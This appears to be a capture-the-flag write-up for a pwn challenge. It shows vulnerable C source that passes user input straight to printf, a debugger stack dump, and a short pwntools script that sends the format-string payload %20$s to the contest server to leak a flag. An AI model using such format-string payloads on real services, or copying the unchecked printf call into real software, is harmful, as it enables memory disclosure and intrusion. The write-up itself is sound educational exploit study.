# Neural Pattern Analysis

In this challenge,we are given the following source code,alongside a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/cu2025/pwn/neural):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];
   readflag(flag, FLAGSIZE);
   printf("Enter neural pattern for analysis >> ");
   scanf("%127s", story);
   printf("Pattern decoded as - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

There is a trivial format string bug in the `vuln` function:

```c
scanf("%127s", story);
printf("Pattern decoded as - \n");
printf(story);
```

All we have to do is to leak the flag with it, which is right above the buffer on the stack.

When debugging, we see the following:


```
Breakpoint 1 at 0x80492b6
Starting program: /home/archstrike/Downloads/neural 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, 0x080492b6 in vuln ()
[H[J[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────── registers ────
$eax   : 0x6       
$ebx   : 0xf7f9be0c  →  0x0022cd2c
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0xffffd7b0  →  0xffffd7c0  →  "aaaaaa"
$ebp   : 0xffffd888  →  0xffffd8a8  →  0xf7ffcca0  →  0x00000000
$esi   : 0x0       
$edi   : 0x0804bf04  →  0x080491c0  →  <__do_global_dtors_aux+0000> endbr32 
$eip   : 0x080492b6  →  <vuln+0060> add esp, 0x10
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────── stack ────
0xffffd7b0│+0x0000: 0xffffd7c0  →  "aaaaaa"	 ← $esp
0xffffd7b4│+0x0004: 0xffffd7c0  →  "aaaaaa"
0xffffd7b8│+0x0008: 0xffffffff
0xffffd7bc│+0x000c: 0xf7d7a8dc  →  0x00001ab5
0xffffd7c0│+0x0010: "aaaaaa"
0xffffd7c4│+0x0014: 0xf7006161 ("aa"?)
0xffffd7c8│+0x0018: 0xffffffff
0xffffd7cc│+0x001c: 0xf7d8052c  →  0x00002232 ("2""?)
──────────────────────────────────────────── code:x86:32 ────
    0x80492aa <vuln+0054>      lea    eax, [ebp-0xc8]
    0x80492b0 <vuln+005a>      push   eax
    0x80492b1 <vuln+005b>      call   0x8049040 <printf@plt>
●→  0x80492b6 <vuln+0060>      add    esp, 0x10
    0x80492b9 <vuln+0063>      sub    esp, 0xc
    0x80492bc <vuln+0066>      push   0xa
    0x80492be <vuln+0068>      call   0x80490b0 <putchar@plt>
    0x80492c3 <vuln+006d>      add    esp, 0x10
    0x80492c6 <vuln+0070>      nop    
──────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "neural", stopped 0x80492b6 in vuln (), reason: BREAKPOINT
────────────────────────────────────────────────── trace ────
[#0] 0x80492b6 → vuln()
[#1] 0x804930f → main()
─────────────────────────────────────────────────────────────
0xffffd7b0│+0x0000: 0xffffd7c0  →  "aaaaaa"	 ← $esp
0xffffd7b4│+0x0004: 0xffffd7c0  →  "aaaaaa"
0xffffd7b8│+0x0008: 0xffffffff
0xffffd7bc│+0x000c: 0xf7d7a8dc  →  0x00001ab5
0xffffd7c0│+0x0010: "aaaaaa"
0xffffd7c4│+0x0014: 0xf7006161 ("aa"?)
0xffffd7c8│+0x0018: 0xffffffff
0xffffd7cc│+0x001c: 0xf7d8052c  →  0x00002232 ("2""?)
0xffffd7d0│+0x0020: 0xf7fbb380  →  0xf7d6f000  →  0x464c457f
0xffffd7d4│+0x0024: 0x00000000
0xffffd7d8│+0x0028: 0xffffd888  →  0xffffd8a8  →  0xf7ffcca0  →  0x00000000
0xffffd7dc│+0x002c: 0xf7f9be0c  →  0x0022cd2c
0xffffd7e0│+0x0030: 0xffffd804  →  0xf7ffdc44  →  0xf7ffdbdc  →  0xf7fbb670  →  0xf7ffda70  →  0x00000000
0xffffd7e4│+0x0034: 0x00000000
0xffffd7e8│+0x0038: 0x0804bfb8  →  <_DYNAMIC+00b0> lock (bad)
0xffffd7ec│+0x003c: 0xf7ffda70  →  0x00000000
0xffffd7f0│+0x0040: 0x08048300  →   add BYTE PTR [edi+0x49], bl
0xffffd7f4│+0x0044: 0xf7fd6f36  →   mov ebp, eax
0xffffd7f8│+0x0048: 0x08048336  →  "setresgid"
0xffffd7fc│+0x004c: 0xf7ffda70  →  0x00000000
0xffffd7b0│+0x0000: 0xffffd7c0  →  "aaaaaa"	 ← $esp
0xffffd7b4│+0x0004: 0xffffd7c0  →  "aaaaaa"
0xffffd7b8│+0x0008: 0xffffffff
0xffffd7bc│+0x000c: 0xf7d7a8dc  →  0x00001ab5
0xffffd7c0│+0x0010: "aaaaaa"
0xffffd7c4│+0x0014: 0xf7006161 ("aa"?)
0xffffd7c8│+0x0018: 0xffffffff
0xffffd7cc│+0x001c: 0xf7d8052c  →  0x00002232 ("2""?)
0xffffd7d0│+0x0020: 0xf7fbb380  →  0xf7d6f000  →  0x464c457f
0xffffd7d4│+0x0024: 0x00000000
0xffffd7d8│+0x0028: 0xffffd888  →  0xffffd8a8  →  0xf7ffcca0  →  0x00000000
0xffffd7dc│+0x002c: 0xf7f9be0c  →  0x0022cd2c
0xffffd7e0│+0x0030: 0xffffd804  →  0xf7ffdc44  →  0xf7ffdbdc  →  0xf7fbb670  →  0xf7ffda70  →  0x00000000
0xffffd7e4│+0x0034: 0x00000000
0xffffd7e8│+0x0038: 0x0804bfb8  →  <_DYNAMIC+00b0> lock (bad)
0xffffd7ec│+0x003c: 0xf7ffda70  →  0x00000000
0xffffd7f0│+0x0040: 0x08048300  →   add BYTE PTR [edi+0x49], bl
0xffffd7f4│+0x0044: 0xf7fd6f36  →   mov ebp, eax
0xffffd7f8│+0x0048: 0x08048336  →  "setresgid"
0xffffd7fc│+0x004c: 0xf7ffda70  →  0x00000000
0xffffd800│+0x0050: 0xffffd840  →  "flag{debug}\n"
0xffffd804│+0x0054: 0xf7ffdc44  →  0xf7ffdbdc  →  0xf7fbb670  →  0xf7ffda70  →  0x00000000
0xffffd808│+0x0058: 0xf7fbb6b0  →  0x08048395  →  "GLIBC_2.0"
0xffffd80c│+0x005c: 0x00000001
0xffffd810│+0x0060: 0x00000001
```
A pointer to the flag is located 21 dwords above the stack pointer,which means it 
is argument number 20.
With this information,we write our final script:

```python
from pwn import *

target = remote('34.130.180.230',7887)
payload = b'%20$s'
target.sendline(payload)
target.interactive()
```

